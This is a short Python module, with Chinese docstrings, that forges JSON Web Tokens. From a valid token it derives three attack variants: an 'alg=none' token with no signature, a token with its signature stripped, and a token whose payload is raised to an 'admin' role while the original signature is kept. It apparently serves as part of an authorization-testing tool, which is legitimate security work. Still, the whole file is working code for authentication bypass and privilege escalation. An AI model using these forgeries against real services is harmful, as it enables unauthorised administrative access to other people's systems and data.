"""JWT 伪造工具 —— 纯函数,从一个有效 JWT 派生几种攻击变体。

只做"被动派生 + 发去看是否被接受",不破解任何密钥。便于单测。
"""

import base64
import json
from typing import Dict, Tuple


def _b64u_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _encode_part(obj: Dict) -> str:
    return _b64u_encode(json.dumps(obj, separators=(",", ":")).encode())


def decode_parts(token: str) -> Tuple[Dict, Dict, str]:
    """token → (header, payload, signature_segment)。"""
    h_seg, p_seg, sig = token.split(".")
    return json.loads(_b64u_decode(h_seg)), json.loads(_b64u_decode(p_seg)), sig


def forge_alg_none(token: str) -> str:
    """alg=none + 空签名 —— 经典的"服务端信任 header 声明的算法"漏洞。"""
    header, payload, _ = decode_parts(token)
    header = {**header, "alg": "none"}
    return f"{_encode_part(header)}.{_encode_part(payload)}."


def forge_unsigned(token: str) -> str:
    """保留算法声明但删掉签名 —— 服务端是否接受空签名。"""
    header, payload, _ = decode_parts(token)
    return f"{_encode_part(header)}.{_encode_part(payload)}."


def forge_tampered(token: str) -> str:
    """篡改 payload(提权)但保留原签名 —— 服务端是否真的校验签名。"""
    header, payload, sig = decode_parts(token)
    payload = {**payload, "role": "admin"}
    if "sub" in payload:
        payload["sub"] = f"{payload['sub']}-tampered"
    return f"{_encode_part(header)}.{_encode_part(payload)}.{sig}"
